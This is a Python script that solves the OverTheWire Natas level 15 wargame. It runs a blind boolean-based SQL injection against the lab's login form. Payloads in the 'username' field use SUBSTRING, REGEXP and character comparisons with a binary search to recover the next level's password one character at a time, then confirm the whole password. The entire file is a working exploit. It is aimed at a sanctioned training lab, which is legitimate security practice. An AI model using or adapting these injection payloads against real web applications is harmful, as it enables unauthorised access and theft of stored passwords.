#!/usr/bin/env python3

import getpass
import requests

###############################################################################
# Configuration
###############################################################################

# The URL of the level as well as the username for it. There will be a known
# password as well, but read it from the user so that it is not published.
LEVEL_CURRENT = 'natas15'
LEVEL_NEXT = 'natas16'
URL = f'http://{LEVEL_CURRENT}.natas.labs.overthewire.org/index.php'

# The strings used to determine if the partial password guess is incorrect or
# correct.
FAILURE_STRING = "This user doesn't exist."
SUCCESS_STRING = 'This user exists.'

# The length of the target password is assumed to be 32, like all previous
# passwords. The characters used in the password guesses are also assumed to be
# the same as in all previous passwords: a-z, A-Z, and 0-9 - but as an
# optimization only the lowercase characters are needed here.
PASSWORD_LENGTH = 32
ALPHA_CHARACTERS = 'abcdefghijklmnopqrstuvwxyz'
NUMERIC_CHARACTERS = '0123456789'

# Global counter for HTTP requests
http_request_count = 0

def get_authentication_credentials() -> tuple[str, str]:
    """Prompt the user for the password and return the authentication tuple."""
    password = getpass.getpass(prompt=f'Enter password for {LEVEL_CURRENT}: ')
    return LEVEL_CURRENT, password

def send_post_request(data: dict[str, str], credentials: tuple[str, str]) -> str:
    """
    Sends a POST request with the given data and authentication.
    Returns the response text or raises an exception on failure.
    """
    global http_request_count
    http_request_count += 1
    response = requests.post(URL, auth=credentials, data=data)
    response.raise_for_status()

    return response.text

def response_indicates_success(response_text: str) -> bool:
    if FAILURE_STRING in response_text:
        return False
    elif SUCCESS_STRING in response_text:
        return True
    else:
        raise RuntimeError(f"Unexpected response:\n{response_text}")

def char_is_alpha(pos: int, credentials: tuple[str, str]) -> bool:
    """
    Test if a single character in the password is an alphabetical character.
    Raises RuntimeError if the response is unexpected.
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND SUBSTRING(password, {pos}, 1) REGEXP "[a-zA-Z]'
    }

    response_text = send_post_request(payload, credentials)

    return response_indicates_success(response_text)

def password_char_greater_than(pos: int, char: str, credentials: tuple[str, str]) -> bool:
    """
    Test if a single character in the password is greater than the given
    character (True) or is equal or less (False).
    Raises RuntimeError if the response is unexpected.
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND SUBSTRING(password, {pos}, 1) > "{char}'
    }

    response_text = send_post_request(payload, credentials)

    return response_indicates_success(response_text)

def confirm_char(pos: int, char: str, credentials: tuple[str, str]) -> bool:
    """
    Confirms a single character by checking equality in one request.
    Returns True if confirmed, False if not.
    Raises RuntimeError if the response is unexpected.
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND BINARY SUBSTRING(password, {pos}, 1) = "{char}'
    }

    response_text = send_post_request(payload, credentials)

    return response_indicates_success(response_text)

def confirm_password(password: str, credentials: tuple[str, str]) -> bool:
    """
    Confirms the full password by checking equality in one request.
    Returns True if confirmed, False if not.
    Raises RuntimeError if the response is unexpected.
    """
    payload = {
        'username': f'{LEVEL_NEXT}" AND BINARY password = "{password}'
    }

    response_text = send_post_request(payload, credentials)

    return response_indicates_success(response_text)

def binary_search_charset(pos: int, charset: str, credentials: tuple[str, str]) -> str:
    """
    For a single character in the password do a binary seach of the values in a
    character set.
    """
    low = 0
    high = len(charset) - 1

    while low < high:
        mid = (low + high) // 2
        if password_char_greater_than(pos, charset[mid], credentials):
            low = mid + 1
        else:
            high = mid

    candidate = charset[low]

    return candidate

def find_char_at_position(pos: int, credentials: tuple[str, str]) -> str:
    if char_is_alpha(pos, credentials):
        candidate = binary_search_charset(pos, ALPHA_CHARACTERS, credentials)
        if candidate:
            # Check if it's upper or lower
            if confirm_char(pos, candidate.upper(), credentials):
                return candidate.upper()
            return candidate
        else:
            raise RuntimeError(f"Failed to confirm alphabetic character at position {pos}")
    else:
        candidate = binary_search_charset(pos, NUMERIC_CHARACTERS, credentials)
        if candidate:
            return candidate
        else:
            raise RuntimeError(f"Failed to confirm numeric character at position {pos}")

def main():
    credentials = get_authentication_credentials()
    password = ''

    for pos in range(1, PASSWORD_LENGTH + 1):
        try:
            found_char = find_char_at_position(pos, credentials)
            password += found_char
            print(f"Found character {pos} of {PASSWORD_LENGTH}: {found_char}")
        except requests.RequestException as e:
            print(f"Network error: {e}")
            return
        except RuntimeError as e:
            print(f"Runtime error: {e}")
            return

    print(f"Candidate password: {password}")
    print("Verifying full password...")

    try:
        if confirm_password(password, credentials):
            print(f"Password confirmed: {password}")
        else:
            print(f"Final confirmation failed. Password may be incorrect.")
    except RuntimeError as e:
        print(f"Runtime error: {e}")

    print(f"Total HTTP requests: {http_request_count}")

if __name__ == '__main__':
    main()
